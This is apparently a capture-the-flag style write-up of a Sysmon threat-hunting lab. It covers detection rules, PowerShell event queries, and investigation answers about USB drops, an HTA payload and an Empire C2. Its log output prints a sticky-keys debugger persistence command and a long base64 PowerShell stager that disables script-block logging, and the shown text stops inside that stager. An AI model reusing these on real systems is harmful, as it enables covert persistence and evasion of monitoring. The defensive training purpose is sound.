1/5/2021 4:41:35 AM              3 Information      Network connection detected:...
1/5/2021 4:41:31 AM              3 Information      Network connection detected:...
1/5/2021 4:41:28 AM              3 Information      Network connection detected:...
1/5/2021 4:41:24 AM              3 Information      Network connection detected:...
1/5/2021 4:41:20 AM              3 Information      Network connection detected:...
1/5/2021 4:41:17 AM              3 Information      Network connection detected:...
1/5/2021 4:41:13 AM              3 Information      Network connection detected:...
1/5/2021 4:41:09 AM              3 Information      Network connection detected:...
1/5/2021 4:41:06 AM              3 Information      Network connection detected:...
1/5/2021 4:41:02 AM              3 Information      Network connection detected:...
1/5/2021 4:40:58 AM              3 Information      Network connection detected:...
1/5/2021 4:40:55 AM              3 Information      Network connection detected:...
1/5/2021 4:40:51 AM              3 Information      Network connection detected:...
1/5/2021 4:40:47 AM              3 Information      Network connection detected:...
1/5/2021 4:40:44 AM              3 Information      Network connection detected:...
1/5/2021 4:40:40 AM              3 Information      Network connection detected:...
1/5/2021 4:40:39 AM              3 Information      Network connection detected:...
1/5/2021 4:40:36 AM              3 Information      Network connection detected:...
1/5/2021 4:40:32 AM              3 Information      Network connection detected:...
1/5/2021 4:40:29 AM              3 Information      Network connection detected:...
1/5/2021 4:40:25 AM              3 Information      Network connection detected:...
1/5/2021 4:40:21 AM              3 Information      Network connection detected:...
1/5/2021 4:40:18 AM              3 Information      Network connection detected:...
1/5/2021 4:40:14 AM              3 Information      Network connection detected:...
1/5/2021 4:40:11 AM              3 Information      Network connection detected:...
1/5/2021 4:40:07 AM              3 Information      Network connection detected:...
1/5/2021 4:40:03 AM              3 Information      Network connection detected:...
1/5/2021 4:40:00 AM              3 Information      Network connection detected:...
1/5/2021 4:39:56 AM              3 Information      Network connection detected:...
1/5/2021 4:39:52 AM              3 Information      Network connection detected:...
1/5/2021 4:39:48 AM              3 Information      Network connection detected:...
1/5/2021 4:39:45 AM              3 Information      Network connection detected:...
1/5/2021 4:39:41 AM              3 Information      Network connection detected:...
1/5/2021 4:39:39 AM              3 Information      Network connection detected:...
1/5/2021 4:39:35 AM              3 Information      Network connection detected:...
1/5/2021 4:39:32 AM              3 Information      Network connection detected:...
1/5/2021 4:39:28 AM              3 Information      Network connection detected:...
1/5/2021 4:39:24 AM              3 Information      Network connection detected:...
1/5/2021 4:39:21 AM              3 Information      Network connection detected:...
1/5/2021 4:39:17 AM              3 Information      Network connection detected:...
1/5/2021 4:38:38 AM              3 Information      Network connection detected:...

```

###  Hunting Persistence 

Persistence Overview

Persistence is used by attackers to maintain access to a machine once it is compromised. There is a multitude of ways for an attacker to gain persistence on a machine we will be focusing on registry modification as well as startup scripts. We can hunt persistence with Sysmon by looking for File Creation events as well as Registry Modification events. The SwiftOnSecurity configuration file does a good job of specifically targeting persistence and techniques used. You can also filter by the Rule Names in order to get past the network noise and focus on anomalies within the event logs. 

You can download the event logs used in this room from this task or you can open them in the Practice folder on the provided machine.


Hunting Startup Persistence

We will first be looking at the SwiftOnSecurity detections for a file being placed in the `\Startup\ or \Start Menu` directories. Below is a snippet of the config that will aid in event tracing for this technique. For more information about this technique check out MITRE ATT&CK [T1547](https://attack.mitre.org/techniques/T1547/).

```
<RuleGroup name="" groupRelation="or">
	<FileCreate onmatch="include">
		<TargetFilename name="T1023" condition="contains">\Start Menu</TargetFilename>
		<TargetFilename name="T1165" condition="contains">\Startup\</TargetFilename>
	</FileCreate>
</RuleGroup>
```

Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1023.evtx`  in Event Viewer to view a live attack on the machine that involves persistence by adding a malicious EXE into the Startup folder.

![](https://i.imgur.com/cQNpkWR.png)

When looking at the Event Viewer we see that persist.exe was placed in the Startup folder. Threat Actors will almost never make it this obvious but any changes to the Start Menu should be investigated. You can adjust the configuration file to be more granular and create alerts past just the File Created tag. We can also filter by the Rule Name T1023

![](https://i.imgur.com/yhRxVrU.png)

![](https://i.imgur.com/zipqQIF.png)

Once you have identified that a suspicious binary or application has been placed in a startup location you can begin an investigation on the directory.


Hunting Registry Key Persistence

We will again be looking at another SwiftOnSecurity detection this time for a registry modification that adjusts that places a script inside `CurrentVersion\Windows\Run` and other registry locations. For more information about this technique check out MITRE ATT&CK [T1112](https://attack.mitre.org/techniques/T1112/).

```
<RuleGroup name="" groupRelation="or">
	<RegistryEvent onmatch="include">
		<TargetObject name="T1060,RunKey" condition="contains">CurrentVersion\Run</TargetObject>
		<TargetObject name="T1484" condition="contains">Group Policy\Scripts</TargetObject>
		<TargetObject name="T1060" condition="contains">CurrentVersion\Windows\Run</TargetObject>
	</RegistryEvent>
</RuleGroup>
```

Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1060.evtx` in Event Viewer to view an attack where the registry was modified to gain persistence.

![](https://i.imgur.com/NkvJNew.png)

When looking at the event logs we see that the registry was modified and malicious.exe was added to `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Persistence` We also see that the exe can be found at %windir%\System32\malicious.exe

Just like the startup technique, we can filter by the RuleName T1060 to make finding the anomaly easier.

If we wanted to investigate this anomaly we would need to look at the registry as well as the file location itself. Below is the registry area where the malicious registry key was placed.

![](https://i.imgur.com/d6hLTud.png)


Read the above and practice hunting persistence techniques.
*No answer needed*

### Detecting Evasion Techniques 

Evasion Techniques Overview

There are a number of evasion techniques used by malware authors to both evade anti-virus and evade detections. Some examples of evasion techniques are Alternate Data Streams, Injections, Masquerading, Packing/Compression, Recompiling, Obfuscation, Anti-Reversing Techniques. In this task, we will be focusing on Alternate Data Streams and Injections. Alternate Data Streams are used by malware to hide its files from normal inspection by saving the file in a different stream apart from $DATA. Sysmon comes with an event ID to detect newly created and accessed streams allowing us to quickly detect and hunt malware that uses ADS. Injection techniques come in many different types: Thread Hijacking, PE Injection, DLL Injection, and more. In this room, we will be focusing on DLL Injection and backdooring DLLs. This is done by taking an already used DLL that is used by an application and overwriting or including your malicious code within the DLL.

For more information about this technique check out MITRE ATT&CK [T1564](https://attack.mitre.org/techniques/T1564/004/) and [T1055](https://attack.mitre.org/techniques/T1055/).

You can download the event logs used in this room from this task or you can open them in the Practice folder on the provided machine.


Hunting Alternate Data Streams

The first technique we will be looking at is hiding files using alternate data streams using Event ID 15. Event ID 15 will hash and log any NTFS Streams that are included within the Sysmon configuration file. This will allow us to hunt for malware that evades detections using ADS. To aid in hunting ADS we will be using the SwiftOnSecurity Sysmon configuration file. The code snippet below will hunt for files in the Temp and Startup folder as well as .hta and .bat extension.

```
<RuleGroup name="" groupRelation="or">
	<FileCreateStreamHash onmatch="include">
		<TargetFilename condition="contains">Downloads</TargetFilename>
		<TargetFilename condition="contains">Temp\7z</TargetFilename>
		<TargetFilename condition="ends with">.hta</TargetFilename>
		<TargetFilename condition="ends with">.bat</TargetFilename>
	</FileCreateStreamHash>
</RuleGroup>
```
Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_ADS.evtx` in Event Viewer to view hidden files using an alternate data stream.

![](https://i.imgur.com/kuQrOwh.png)

![](https://i.imgur.com/HLQMibL.png)

As you can see the event will show us the location of the file name as well as the contents of the file this will be useful if an investigation is necessary.


Detecting Remote Threads 

Adversaries also commonly use remote threads to evade detections in combination with other techniques. Remote threads are created using the Windows API CreateRemoteThread and can be accessed using OpenThread and ResumeThread. This is used in multiple evasion techniques including DLL Injection, Thread Hijacking, and Process Hollowing. We will be using the Sysmon event ID 8 from the SwiftOnSecurity configuration file. The code snippet below from the rule will exclude common remote threads without including any specific attributes this allows for a more open and precise event rule. 

```
<RuleGroup name="" groupRelation="or">
	<CreateRemoteThread onmatch="exclude">
		<SourceImage condition="is">C:\Windows\system32\svchost.exe</SourceImage>
		<TargetImage condition="is">C:\Program Files (x86)\Google\Chrome\Application\chrome.exe</TargetImage>
	</CreateRemoteThread>
</RuleGroup>
```

Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Detecting_RemoteThreads.evtx` in Event Viewer to observe a Process Hollowing attack that abuses the notepad.exe process. 

![](https://i.imgur.com/R2cRHqa.png)

As you can see in the above image powershell.exe is creating a remote thread and accessing notepad.exe this is obviously a PoC and could in theory execute any other kind of executable or DLL. The specific technique used in this example is called Reflective PE Injection. 


Detecting Evasion Techniques with PowerShell

We have already gone through a majority of the syntax required to use PowerShell with events. Like previous tasks, we will be using Get-WinEvent along with the XPath to filter and search for files that use an alternate data stream or create a remote thread. In both of the events, we will only need to filter by the EventID because the rule used within the configuration file is already doing a majority of the heavy lifting. 

Detecting Alternate Data Streams

Syntax: `Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=15'`

![](https://i.imgur.com/etAHMEt.png)

Detecting Remote Thread Creation

Syntax: `Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=8'`

![](https://i.imgur.com/PJNairD.png)


Read the above and practice detecting evasion techniques
*No answer needed*

###  Practical Investigations 

Event files used within this task have been sourced from the EVTX-ATTACK-SAMPLES and SysmonResourcesGithub repositories.

You can download the event logs used in this room from this task or you can open them in the Investigations folder on the provided machine.


Investigation 1 - ugh, BILL THAT'S THE WRONG USB!

In this investigation, your team has received reports that a malicious file was dropped onto a host by a malicious USB. They have pulled the logs suspected and have tasked you with running the investigation for it.

Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1`.


Investigation 2 - This isn't an HTML file? 

Another suspicious file has appeared in your logs and has managed to execute code masking itself as an HTML file, evading your anti-virus detections. Open the logs and investigate the suspicious file.  

Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2`.


Investigation 3.1 - 3.2 - Where's the bouncer when you need him

Your team has informed you that the adversary has managed to set up persistence on your endpoints as they continue to move throughout your network. Find how the adversary managed to gain persistence using logs provided.

Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.1`

and `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2`.


Investigation 4 - Mom look! I built a botnet!

As the adversary has gained a solid foothold onto your network it has been brought to your attention that they may have been able to set up C2 communications on some of the endpoints. Collect the logs and continue your investigation.

Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-4`.


```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=13 and */EventData/Data[@Name="Image"]="C:\Windows\system32\svchost.exe"' | FL


TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: SetValue
               EventType: 2018-03-06 06:57:51.007
               UtcTime: {2ca4c7ef-396e-5a9e-0000-001007c50000}
               ProcessGuid: 616
               ProcessId: 0
               Image: HKLM\System\CurrentControlSet\Enum\WpdBusEnumRoot\UMB\2&37c186b&0&STORAGE#VOLUME#_??_USBSTOR#DISK
               &VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\FriendlyName
               TargetObject: U
               Details: %8
```
What is the full registry key of the USB device calling svchost.exe in Investigation 1? 
`HKLM\System\CurrentControlSet\Enum\WpdBusEnumRoot\UMB\2&37c186b&0&STORAGE#VOLUME#_??_USBSTOR#DISK                &VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\FriendlyName`

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=9' | fl


TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:51.070
               UtcTime: {2ca4c7ef-396f-5a9e-0000-0010a06d0100}
               ProcessGuid: 1388
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6

TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:51.054
               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
               ProcessGuid: 892
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6

TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:51.023
               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
               ProcessGuid: 892
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6

TimeCreated  : 3/6/2018 6:57:50 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:50.992
               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
               ProcessGuid: 892
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6

```
What is the device name when being called by RawAccessRead in Investigation 1?
`\Device\HarddiskVolume3`

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=9' | fl


TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:51.070
               UtcTime: {2ca4c7ef-396f-5a9e-0000-0010a06d0100}
               ProcessGuid: 1388
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6

TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:51.054
               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
               ProcessGuid: 892
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6

TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:51.023
               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
               ProcessGuid: 892
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6

TimeCreated  : 3/6/2018 6:57:50 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 9
Message      : RawAccessRead detected:
               RuleName: 2018-03-06 06:57:50.992
               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
               ProcessGuid: 892
               ProcessId: 0
               Image: \Device\HarddiskVolume3
               Device: %6



PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name="Image"]' | fl


TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: 2018-03-06 06:57:51.132
               UtcTime: {2ca4c7ef-3bef-5a9e-0000-001081120e00}
               ProcessGuid: 3348
               ProcessId: 0
               Image: 6.1.7600.16385 (win7_rtm.090713-1255)
               FileVersion: Windows Calculator
               Description: Microsoft® Windows® Operating System
               Product: Microsoft Corporation
               Company: calc.exe
               OriginalFileName: C:\Windows\system32\
               CommandLine: WIN-7JKBJEGBO38\q
               CurrentDirectory: {2ca4c7ef-396f-5a9e-0000-002001500100}
               User: 0x15001
               LogonGuid: 1
               LogonId: 0x0
               TerminalSessionId: 0
               IntegrityLevel: {2ca4c7ef-3bef-5a9e-0000-0010a5110e00}
               Hashes: 4024
               ParentProcessGuid: C:\Windows\System32\rundll32.exe
               ParentProcessId: 0
               ParentImage: %21
               ParentCommandLine: %22

TimeCreated  : 3/6/2018 6:57:51 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: 2018-03-06 06:57:51.117
               UtcTime: {2ca4c7ef-3bef-5a9e-0000-0010a5110e00}
               ProcessGuid: 4024
               ProcessId: 0
               Image: 6.1.7600.16385 (win7_rtm.090713-1255)
               FileVersion: Windows host process (Rundll32)
               Description: Microsoft® Windows® Operating System
               Product: Microsoft Corporation
               Company: rundll32.exe
               OriginalFileName: C:\Windows\system32\
               CommandLine: WIN-7JKBJEGBO38\q
               CurrentDirectory: {2ca4c7ef-396f-5a9e-0000-002001500100}
               User: 0x15001
               LogonGuid: 1
               LogonId: 0x0
               TerminalSessionId: 0
               IntegrityLevel: {2ca4c7ef-396f-5a9e-0000-0010a06d0100}
               Hashes: 1388
               ParentProcessGuid: C:\Windows\explorer.exe
               ParentProcessId: 0
               ParentImage: %21
               ParentCommandLine: %22

TimeCreated  : 3/6/2018 6:57:48 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: 2018-03-06 06:57:48.862
               UtcTime: {2ca4c7ef-3bec-5a9e-0000-0010d9070e00}
               ProcessGuid: 2532
               ProcessId: 0
               Image: 6.1.7600.16385 (win7_rtm.090713-1255)
               FileVersion: Windows Driver Foundation - User-mode Driver Framework Host Process
               Description: Microsoft® Windows® Operating System
               Product: Microsoft Corporation
               Company: "C:\Windows\system32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa}
               -IoEventPortName:HostProcess-b3991627-8e80-4a48-be41-a12b4979d572
               -SystemEventPortName:HostProcess-504712cb-dc72-4707-891c-16eb8c62dfad
               -IoCancelEventPortName:HostProcess-f886f18d-a113-4114-b00c-6b2841510043
               -NonStateChangingEventPortName:HostProcess-8464b40d-8d03-4f17-8b35-e9bb1151d881
               -ServiceSID:S-1-5-80-2652678385-582572993-1835434367-1344795993-749280709
               -LifetimeId:ce14470f-7eed-46d5-b7e3-273df615d259
               OriginalFileName: C:\Windows\system32\
               CommandLine: NT AUTHORITY\LOCAL SERVICE
               CurrentDirectory: {2ca4c7ef-396e-5a9e-0000-0020e5030000}
               User: 0x3e5
               LogonGuid: 0
               LogonId: 0x0
               TerminalSessionId: 0
               IntegrityLevel: {2ca4c7ef-396e-5a9e-0000-00101e230100}
               Hashes: 848
               ParentProcessGuid: C:\Windows\System32\svchost.exe
               ParentProcessId: 0
               ParentImage: %21
               ParentCommandLine: %22
```

What is the first exe the process executes in Investigation 1?
*rundll32.exe*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx -FilterXPath '*/System/EventID=1' | fl


TimeCreated  : 6/15/2019 7:14:32 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName:
               UtcTime: 2019-06-15 07:14:32.622
               ProcessGuid: {365abb72-9ad8-5d04-0000-0010c08c1000}
               ProcessId: 3892
               Image: C:\Windows\System32\dllhost.exe
               FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
               Description: COM Surrogate
               Product: Microsoft® Windows® Operating System
               Company: Microsoft Corporation
               OriginalFileName: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
               CommandLine: C:\Windows\system32\
               CurrentDirectory: IEWIN7\IEUser
               User: {365abb72-98e4-5d04-0000-0020a4350100}
               LogonGuid: 0x135a4
               LogonId: 0x1
               TerminalSessionId: 0
               IntegrityLevel: SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA25
               6=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8
               829
               Hashes: {365abb72-1771-5d05-0000-001030790000}
               ParentProcessGuid: 616
               ParentProcessId: 0
               ParentImage: C:\Windows\system32\svchost.exe -k DcomLaunch
               ParentCommandLine: %22

TimeCreated  : 6/15/2019 7:13:42 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName:
               UtcTime: 2019-06-15 07:13:42.278
               ProcessGuid: {365abb72-9aa6-5d04-0000-00109c850f00}
               ProcessId: 652
               Image: C:\Windows\System32\mshta.exe
               FileVersion: 11.00.9600.16428 (winblue_gdr.131013-1700)
               Description: Microsoft (R) HTML Application host
               Product: Internet Explorer
               Company: Microsoft Corporation
               OriginalFileName: "C:\Windows\System32\mshta.exe"
               "C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet
               Files\Content.IE5\S97WTYG7\update.hta"
               CommandLine: C:\Users\IEUser\Desktop\
               CurrentDirectory: IEWIN7\IEUser
               User: {365abb72-98e4-5d04-0000-0020a4350100}
               LogonGuid: 0x135a4
               LogonId: 0x1
               TerminalSessionId: 0
               IntegrityLevel: SHA1=D4F0397F83083E1C6FB0894187CC72AEBCF2F34F,MD5=ABDFC692D9FE43E2BA8FE6CB5A8CB95A,SHA25
               6=949485BA939953642714AE6831D7DCB261691CAC7CBB8C1A9220333801F60820,IMPHASH=00B1859A95A316FD37DFF42104809
               07A
               Hashes: {365abb72-9972-5d04-0000-0010f0490c00}
               ParentProcessGuid: 3660
               ParentProcessId: 0
               ParentImage: "C:\Program Files\Internet Explorer\iexplore.exe" C:\Users\IEUser\Downloads\update.html
               ParentCommandLine: %22
```

What is the full path of the payload in Investigation 2?
`C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet                Files\Content.IE5\S97WTYG7\update.hta`

What is the full path of the file the payload masked itself as in Investigation 2?
`C:\Users\IEUser\Downloads\update.html`

What signed binary executed the payload in Investigation 2?
`C:\Windows\System32\mshta.exe`

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx -FilterXPath '*/System/EventID=3' | fl


TimeCreated  : 6/15/2019 7:13:44 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName:
               UtcTime: 2019-06-15 07:13:42.577
               ProcessGuid: {365abb72-9aa6-5d04-0000-00109c850f00}
               ProcessId: 652
               Image: C:\Windows\System32\mshta.exe
               User: IEWIN7\IEUser
               Protocol: tcp
               Initiated: true
               SourceIsIpv6: false
               SourceIp: 10.0.2.13
               SourceHostname: IEWIN7
               SourcePort: 49159
               SourcePortName:
               DestinationIsIpv6: false
               DestinationIp: 10.0.2.18
               DestinationHostname:
               DestinationPort: 4443
               DestinationPortName:

```
What is the IP of the adversary in Investigation 2?
*10.0.2.18*

What back connect port is used in Investigation 2?
*4443*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.1.evtx -FilterXPath '*/System/EventID=3' | fl


TimeCreated  : 2/12/2018 9:15:59 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-12 09:15:58.664
               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
               ProcessGuid: 12224
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 54923
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/12/2018 9:15:58 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-12 09:15:58.434
               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
               ProcessGuid: 12224
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 54922
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18

TimeCreated  : 2/12/2018 9:15:53 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 3
Message      : Network connection detected:
               RuleName: 2018-02-12 09:15:53.406
               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
               ProcessGuid: 12224
               ProcessId: 0
               Image: DESKTOP-O153T4R\q
               User: tcp
               Protocol: true
               Initiated: false
               SourceIsIpv6: 172.16.199.179
               SourceIp: DESKTOP-O153T4R.localdomain
               SourceHostname: 54921
               SourcePort: 0
               SourcePortName: false
               DestinationIsIpv6: 172.30.1.253
               DestinationIp: empirec2
               DestinationHostname: 80
               DestinationPort: 0
               DestinationPortName: %18
```

What is the IP of the suspected adversary in Investigation 3.1?
*172.30.1.253*

What is the hostname of the affected endpoint in Investigation 3.1?
*DESKTOP-O153T4R*

What is the hostname of the C2 server connecting to the endpoint in Investigation 3.1?
*empirec2*

```
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.1.evtx -FilterXPath '*/System/EventID=13' | fl


TimeCreated  : 2/12/2018 9:15:57 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: SetValue
               EventType: 2018-02-12 09:15:57.046
               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
               ProcessGuid: 12224
               ProcessId: 0
               Image: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger
               TargetObject: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp
               HKLM:Software\Microsoft\Network debug).debug);start -Win Hidden -A \"-enc $x\" powershell";exit;
               Details: %8

TimeCreated  : 2/12/2018 9:15:57 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: SetValue
               EventType: 2018-02-12 09:15:57.014
               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
               ProcessGuid: 12224
               ProcessId: 0
               Image: HKLM\SOFTWARE\Microsoft\Network\debug
               TargetObject: SQBGACgAJABQAFMAVgBlAFIAUwBJAE8ATgBUAEEAYgBMAGUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUg
               AgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQ
               BzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdA
               BGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJw
               ArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALg
               BHAGUAVABWAEEAbAB1AGUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAaw
               BMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJw
               BdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQw
               BbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdA
               BCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAE8AbABMAEUAYw
               BUAEkAbwBOAHMALgBHAEUATgBFAFIAaQBDAC4ARABpAGMAdABpAG8ATgBBAHIAeQBbAHMAdAByAEkATgBHACwAUwBZAFMAdABFAE0ALg
               BPAGIAagBFAGMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQg
               AnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQ
               BwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQ
               BfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8Acw
               BvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbw
               BnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUATABTAEUAewBbAFMAYwByAEkAcAB0AEIATABPAGMAawBdAC4AIgBHAGUAdABGAEkAZQ
               BgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJw
